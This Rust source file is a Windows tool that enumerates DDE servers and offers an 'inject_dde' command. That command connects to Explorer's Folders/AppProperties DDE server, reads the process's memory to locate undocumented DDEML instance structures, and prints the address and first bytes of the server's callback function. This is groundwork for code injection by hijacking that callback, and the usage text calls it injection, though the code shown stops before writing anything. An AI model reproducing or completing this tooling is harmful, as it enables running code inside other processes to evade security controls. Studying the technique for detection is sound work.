#![allow(non_snake_case)]
use std::{
    env::consts,
    mem::zeroed,
    os::{raw::c_void, windows::raw::HANDLE},
    ptr::null_mut,
};

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        DataExchange::{
            APPCLASS_STANDARD, APPCMD_FILTERINITS, CONVINFO, CP_WINANSI, DMLERR_NO_ERROR,
            DdeConnect, DdeConnectList, DdeCreateStringHandleA, DdeDisconnectList,
            DdeFreeStringHandle, DdeGetLastError, DdeInitializeA, DdeQueryConvInfo,
            DdeQueryNextServer, DdeQueryStringA, HCONV, HSZ, PFNCALLBACK, QID_SYNC,
        },
        Diagnostics::Debug::ReadProcessMemory,
        Threading::{
            OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ,
            PROTECTION_LEVEL_CODEGEN_LIGHT, QueryFullProcessImageNameA,
        },
    },
    UI::WindowsAndMessaging::{GetWindowLongPtrA, GetWindowThreadProcessId},
};

type LATOM = u16;

type PLINK_COUNT = *mut c_void;

#[repr(C)]
struct SERVER_LOOKUP {
    laService: LATOM,
    laTopic: LATOM,
    hwndServer: isize,
}
type PSERVER_LOOKUP = *mut SERVER_LOOKUP;

#[repr(C)]
struct CL_INSTANCE_INFO {
    next: *const CL_INSTANCE_INFO,
    hInstServer: *mut c_void,
    hInstClient: *mut c_void,
    MonitorFlags: u32,
    hwndMother: isize,
    hwndEvent: isize,
    hwndTimeout: isize,
    afCmd: u32,
    pfnCallback: PFNCALLBACK,
    LastError: u32,
    tid: u32,
    plaNameService: *mut u16,
    cNameServiceAlloc: u16,
    aServerLookup: PSERVER_LOOKUP,
    cServerLookupAlloc: i16,
    ConvStartupState: u16,
    flags: u16,
    cInDDEMLCallback: i16,
    pLinkCount: PLINK_COUNT,
}

#[repr(C)]
struct CONV_INFO {
    padding: [u8; 0x008],
    instance: *const CL_INSTANCE_INFO,
}

fn hsz_to_string(instance_id: u32, hsz: HSZ) -> String {
    unsafe {
        if hsz.is_null() {
            return String::new();
        }

        let len = DdeQueryStringA(instance_id, hsz, null_mut(), 0, CP_WINANSI);
        if len == 0 {
            return String::new();
        }
        let mut buffer = vec![0; len as usize + 1];
        if DdeQueryStringA(instance_id, hsz, buffer.as_mut_ptr(), len + 1, CP_WINANSI) == 0 {
            println!(
                "[-] DdeQueryStringA failed: {}",
                DdeGetLastError(instance_id)
            );
            return String::new();
        }

        let string = buffer.iter().position(|&b| b == 0).unwrap_or(buffer.len());
        String::from_utf8_lossy(&buffer[..string]).into_owned()
    }
}

fn get_proc_name(pid: u32) -> String {
    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);

        if handle.is_null() {
            println!(
                "[-] OpenProcess failed: {}",
                std::io::Error::last_os_error()
            );
            return String::new();
        }

        let mut buffer = [0; 260];
        let mut size = buffer.len() as u32;
        if QueryFullProcessImageNameA(handle, 0, buffer.as_mut_ptr(), &mut size) == 0 {
            println!(
                "[-] QueryFullProcessImageNameA failed: {}",
                std::io::Error::last_os_error()
            );
            return String::new();
        }
        CloseHandle(handle);

        let proc_name = String::from_utf8_lossy(&buffer[..size as usize]).into_owned();
        proc_name
            .rsplit('\\')
            .next()
            .unwrap_or(&proc_name)
            .to_string()
    }
}

fn enum_dde() {
    unsafe {
        let mut instance_id: u32 = 0;
        let result = DdeInitializeA(
            &mut instance_id,
            None,
            APPCLASS_STANDARD | APPCMD_FILTERINITS,
            0,
        );

        if result != DMLERR_NO_ERROR {
            println!("[-] DdeInitializeA failed with error code: {}", result);
            return;
        }

        let hlist = DdeConnectList(instance_id, null_mut(), null_mut(), null_mut(), null_mut());

        if hlist.is_null() {
            println!("[-] No DDE Servers found: {}", DdeGetLastError(instance_id));
            return;
        }

        let mut hconv = zeroed::<HCONV>();
        loop {
            hconv = DdeQueryNextServer(hlist, hconv);
            if hconv.is_null() {
                break;
            }

            let mut ci = zeroed::<CONVINFO>();
            ci.cb = size_of::<CONVINFO>() as u32;

            if DdeQueryConvInfo(hconv, QID_SYNC, &mut ci) == 0 {
                println!(
                    "[-] DdeQueryConvInfo failed: {}",
                    DdeGetLastError(instance_id)
                );
                continue;
            }

            let service_name = hsz_to_string(instance_id, ci.hszSvcPartner);
            let topic_name = hsz_to_string(instance_id, ci.hszTopic);
            let mut pid: u32 = 0;

            if !ci.hwndPartner.is_null() {
                GetWindowThreadProcessId(ci.hwndPartner, &mut pid);
            }

            let proc_name = get_proc_name(pid);

            println!("[+] DDE Server Found:");
            println!("    Service Name: {}", service_name);
            println!("    Topic Name: {}", topic_name);
            println!("    Process ID: {}", pid);
            println!("    Process Name: {}", proc_name);
        }

        DdeDisconnectList(hlist);
    }
}

fn inject_dde() {
    unsafe {
        let mut instance_id: u32 = 0;
        let result = DdeInitializeA(
            &mut instance_id,
            None,
            APPCLASS_STANDARD | APPCMD_FILTERINITS,
            0,
        );

        if result != DMLERR_NO_ERROR {
            println!("[-] DdeInitializeA failed with error code: {}", result);
            return;
        }

        let service_name = "Folders\0".as_ptr() as *const u8;

        let hsz_service = DdeCreateStringHandleA(instance_id, service_name, CP_WINANSI);

        let topic_name = "AppProperties\0".as_ptr() as *const u8;
        let hsz_topic = DdeCreateStringHandleA(instance_id, topic_name, CP_WINANSI);
        if hsz_service.is_null() || hsz_topic.is_null() {
            println!(
                "[-] DdeCreateStringHandleA failed: {}",
                DdeGetLastError(instance_id)
            );
            return;
        }

        let hconv = DdeConnect(instance_id, hsz_service, hsz_topic, null_mut());

        if hconv.is_null() {
            println!("[-] DdeConnect failed: {}", DdeGetLastError(instance_id));
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let mut ci = zeroed::<CONVINFO>();
        ci.cb = size_of::<CONVINFO>() as u32;
        if DdeQueryConvInfo(hconv, QID_SYNC, &mut ci) == 0 {
            println!(
                "[-] DdeQueryConvInfo failed: {}",
                DdeGetLastError(instance_id)
            );
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let server_hwnd = ci.hwndPartner;
        let mut pid: u32 = 0;
        if !server_hwnd.is_null() {
            GetWindowThreadProcessId(server_hwnd, &mut pid);
        }
        let proc_name = get_proc_name(pid);

        println!("[+] {} PID: {}", proc_name, pid);
        println!(
            "[+] Connected to Folders/AppProperties Handle: {:x}",
            server_hwnd as usize
        );

        let ewm0 = GetWindowLongPtrA(server_hwnd, 0);
        if ewm0 == 0 {
            println!(
                "[-] GetWindowLongPtrA failed: {}",
                std::io::Error::last_os_error()
            );
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }
        println!("[+] EWN[0] DDEMLUnicodeServer: 0x{:016x}", ewm0 as usize);

        let h_proc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
        if h_proc.is_null() {
            println!(
                "[-] OpenProcess failed: {}",
                std::io::Error::last_os_error()
            );
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let mut conv_info = zeroed::<CONV_INFO>();
        let mut bytes_read: usize = 0;
        if ReadProcessMemory(
            h_proc,
            ewm0 as *const c_void,
            &mut conv_info as *mut _ as *mut c_void,
            size_of::<CONV_INFO>(),
            &mut bytes_read,
        ) == 0
        {
            println!(
                "[-] ReadProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let instance_addr = conv_info.instance;
        println!(
            "[+] CL_INSTANCE_INFO Address: 0x{:016x}",
            instance_addr as usize
        );

        let mut instance_info = zeroed::<CL_INSTANCE_INFO>();
        if ReadProcessMemory(
            h_proc,
            instance_addr as *const c_void,
            &mut instance_info as *mut _ as *mut c_void,
            size_of::<CL_INSTANCE_INFO>(),
            &mut bytes_read,
        ) == 0
        {
            println!(
                "[-] ReadProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let org_callbak = instance_info.pfnCallback.map(|f| f as usize).unwrap_or(0);
        if org_callbak == 0 {
            println!("[-] Original callback function pointer is null");
            CloseHandle(h_proc);
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let mut buffer = [0u8; 8];
        if ReadProcessMemory(
            h_proc,
            org_callbak as *const c_void,
            buffer.as_mut_ptr() as *mut c_void,
            8,
            std::ptr::null_mut(),
        ) == 0
        {
            println!(
                "[-] ReadProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            return;
        }

        println!("[+] pfnCallback Address: 0x{:016x}", org_callbak);
        println!(
            "[+] pfnCallback Prologue: {:02X} {:02X} {:02X} {:02X} {:02X} {:02X} {:02X} {:02X}",
            buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5], buffer[6], buffer[7]
        );
    }
}

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() < 2 {
        println!("Usage: {} <command>", args[0]);
        println!("Commands:");
        println!("  enum_dde - Enumerate DDE servers");
        println!("  inject_dde - Inject into a DDE server");
        return;
    }

    match args[1].as_str() {
        "enum_dde" => enum_dde(),
        "inject_dde" => inject_dde(),
        _ => {
            println!("Unknown command: {}", args[1]);
            println!("Usage: {} <command>", args[0]);
            println!("Commands:");
            println!("  enum_dde - Enumerate DDE servers");
            println!("  inject_dde - Inject into a DDE server");
        }
    }
}
